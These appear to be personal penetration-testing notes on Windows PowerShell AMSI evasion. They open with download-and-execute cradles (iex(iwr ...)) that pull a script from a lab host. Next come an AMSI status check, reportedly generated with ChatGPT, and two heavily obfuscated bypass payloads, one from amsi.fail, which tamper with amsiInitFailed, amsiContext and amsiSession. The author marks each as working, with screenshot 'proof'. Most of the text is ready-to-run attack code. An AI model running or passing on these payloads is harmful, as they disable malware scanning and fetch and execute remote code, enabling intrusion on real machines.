![[Pasted image 20250812153310.png]]
`iex(iwr http://192.168.127.134/a -useb)` 

`[IO.StreamReader]::new([Net.WebRequest]::Create('http://192.168.127.134/a').GetResponse().GetResponseStream()).ReadToEnd()`

`$w=(New-Object Net.WebClient);$w.(((($w).PsObject.Methods)|?{(Item Variable:\_).Value.Name-clike'D*g'}).Name).Invoke('http://192.168.127.134/a')`



to check if amsi is running 
```
# Test AMSI availability
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') |
  ForEach-Object { $_.GetField('amsiInitFailed','NonPublic,Static').GetValue($null) }
```
false = enabled
true - disabled

script that chatgpt generated
```bash
$amsiInit = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)
$scanTest = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetMethod('ScanContent','NonPublic,Static').Invoke($null,@('AMSI Test String',''))
if (-not $amsiInit -and $scanTest -ne 0) { "✅ AMSI is ON and scanning" } elseif ($amsiInit) { "❌ AMSI is OFF or failed to initialize" } else { "⚠ AMSI initialized but scan test failed" }
```
![[Pasted image 20250812155616.png]]


a working `amsi` found with amsi.fails

```bash
$kkpdvxB=$null;$Oz6YNPorIuxLyvU="System.$(('M'+'ä'+'n'+'á'+'g'+'é'+'m'+'ê'+'n'+'t').normALize([cHar](70)+[CHar](111)+[ChAR](114)+[char](109+84-84)+[CHAR](68)) -replace [CHAr](92+78-78)+[chAr](100+12)+[chaR]([ByTe]0x7b)+[ChaR]([byte]0x4d)+[cHar]([byTe]0x6e)+[chaR]([BYtE]0x7d)).$([CHar](65+28-28)+[chAR](117)+[cHAr]([byte]0x74)+[ChAr](111)+[cHAr]([BYTe]0x6d)+[ChaR]([bYTe]0x61)+[cHAR]([bYte]0x74)+[chAr]([ByTE]0x69)+[ChAr]([bytE]0x6f)+[CHaR]([bYtE]0x6e)).$([char](65)+[chaR](109+101-101)+[cHaR](33+82)+[CHar](105)+[CHAr](85*47/47)+[CHAR]([ByTe]0x74)+[Char]([byTe]0x69)+[CHAr](56+52)+[chAR]([bytE]0x73))";$ekhlsjbievaokyksgavmtaiyr="+('lhãqvkk'+'vyjxjnà'+'qxck').NOrMalIzE([CHAR]([byTe]0x46)+[ChAR]([bytE]0x6f)+[chAR](114+37-37)+[cHar](109)+[chAr](10+58)) -replace [ChaR](43+49)+[chaR]([BytE]0x70)+[CHAR]([BYTe]0x7b)+[ChaR](77+73-73)+[cHar]([bYTe]0x6e)+[CHar]([bYtE]0x7d)";[Threading.Thread]::Sleep(791);[Ref].Assembly.GetType($Oz6YNPorIuxLyvU).GetField($(('ämsîÌnìtFâíl'+'éd').NoRMAlIze([cHAR](70)+[cHAR](111*78/78)+[cHar]([bYte]0x72)+[char]([bytE]0x6d)+[chAr]([ByTE]0x44)) -replace [CHAR]([BYte]0x5c)+[ChaR]([bYTE]0x70)+[ChAR]([byTe]0x7b)+[ChaR]([byTe]0x4d)+[cHAR]([bytE]0x6e)+[chAr]([BYte]0x7d)),"NonPublic,Static").SetValue($kkpdvxB,$true);$vjseeoktlevxuiv="+('dwûféôt'+'ncxcqyw'+'éltyàbm'+'vjf').NoRmAlIzE([chAr]([ByTE]0x46)+[CHar](111+15-15)+[chAR]([byte]0x72)+[ChaR](12+97)+[ChAr]([BYTe]0x44)) -replace [CHAR]([byte]0x5c)+[ChAr](112*7/7)+[ChaR](89+34)+[CHar](77*15/15)+[Char](53+57)+[cHaR](125)";[Threading.Thread]::Sleep(479)
```
proof it worked
![[Pasted image 20250812155826.png]]

potential working `amsi bypass`
```bash
#Unknown - Force error 
$fLEvI9usk3=$null;$ejUH=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076*5580/5580));$nmvnrkafsdnuujydztr="+('pgcúkõ'+'hzqwdt'+'rléxrj'+'gk').nOrmALIzE([ChaR]([ByTe]0x46)+[CHAr](39+72)+[CHar](114*2/2)+[CHAR]([byTe]0x6d)+[CHaR]([bytE]0x44)) -replace [cHAr](17+75)+[ChAr]([byte]0x70)+[cHAR](123+25-25)+[CHar](46+31)+[chAR]([bytE]0x6e)+[cHAR]([bYte]0x7d)";[Threading.Thread]::Sleep(1091);[Ref].Assembly.GetType("System.$(('Mánà'+'gémé'+'nt').norMalIZE([cHAR]([BYtE]0x46)+[cHaR](111)+[CHAr]([Byte]0x72)+[CHAr]([bYte]0x6d)+[ChaR]([byTe]0x44)) -replace [cHAR](92*81/81)+[CHar](54+58)+[ChAr](123+35-35)+[chAr](77*5/5)+[chaR](110)+[CHAr]([bytE]0x7d)).$(('Äútómát'+'îón').NoRMalize([chAr](70)+[ChAR]([BYte]0x6f)+[ChAR](114*90/90)+[cHaR]([Byte]0x6d)+[chAR](68*37/37)) -replace [ChAr](92*13/13)+[chAr]([byTE]0x70)+[Char](123+60-60)+[char](77)+[CHar](110)+[ChAr](71+54)).$([CHAr]([ByTe]0x41)+[CHAR]([bYte]0x6d)+[cHAr]([BYtE]0x73)+[CHAr]([BYte]0x69)+[chAr]([bYtE]0x55)+[chAr]([bYtE]0x74)+[ChAr]([ByTE]0x69)+[ChAR]([ByTE]0x6c)+[CHar](115+45-45))").GetField("$([char]([byTE]0x61)+[Char]([bYTe]0x6d)+[Char]([ByTe]0x73)+[CHAr]([Byte]0x69)+[char](83+35-35)+[chAr]([byte]0x65)+[chAR](115+55-55)+[CHar]([bYte]0x73)+[CHaR](67+38)+[chAr]([BYTe]0x6f)+[char](110))", "NonPublic,Static").SetValue($fLEvI9usk3, $fLEvI9usk3);[Ref].Assembly.GetType("System.$(('Mánà'+'gémé'+'nt').norMalIZE([cHAR]([BYtE]0x46)+[cHaR](111)+[CHAr]([Byte]0x72)+[CHAr]([bYte]0x6d)+[ChaR]([byTe]0x44)) -replace [cHAR](92*81/81)+[CHar](54+58)+[ChAr](123+35-35)+[chAr](77*5/5)+[chaR](110)+[CHAr]([bytE]0x7d)).$(('Äútómát'+'îón').NoRMalize([chAr](70)+[ChAR]([BYte]0x6f)+[ChAR](114*90/90)+[cHaR]([Byte]0x6d)+[chAR](68*37/37)) -replace [ChAr](92*13/13)+[chAr]([byTE]0x70)+[Char](123+60-60)+[char](77)+[CHar](110)+[ChAr](71+54)).$([CHAr]([ByTe]0x41)+[CHAR]([bYte]0x6d)+[cHAr]([BYtE]0x73)+[CHAr]([BYte]0x69)+[chAr]([bYtE]0x55)+[chAr]([bYtE]0x74)+[ChAr]([ByTE]0x69)+[ChAR]([ByTE]0x6c)+[CHar](115+45-45))").GetField("$([ChAR]([bYTE]0x61)+[CHar](109+64-64)+[CHAR]([BYTe]0x73)+[Char](93+12)+[CHar]([BYtE]0x43)+[cHAr](62+49)+[ChAR]([bYtE]0x6e)+[CHAr](116)+[CHAR](101*76/76)+[cHaR]([BYTe]0x78)+[char](116+1-1))", "NonPublic,Static").SetValue($fLEvI9usk3, [IntPtr]$ejUH);$vuoffs="+[chAR]([byTE]0x78)+[char](111+86-86)+[Char]([bYtE]0x7a)+[char]([bYtE]0x65)+[CHaR]([bYte]0x72)+[ChAr](110+84-84)+[ChaR](101*14/14)+[chAr]([bytE]0x70)+[CHAR](17+90)+[ChAR](98+65-65)+[cHaR]([ByTe]0x76)+[Char](110*43/43)+[CHar]([bYtE]0x64)+[ChAR](107*2/2)+[char](120+99-99)+[cHaR](120)+[cHAR]([byTE]0x79)+[chaR](98+22-22)+[cHAr](115+20-20)+[ChAR]([BYte]0x76)+[cHAR](103)+[chAr](36+82)+[chAr]([BYte]0x68)+[chaR](104)+[char]([byte]0x61)";[Threading.Thread]::Sleep(1910)
```
proof it works
![[Pasted image 20250826144445.png]]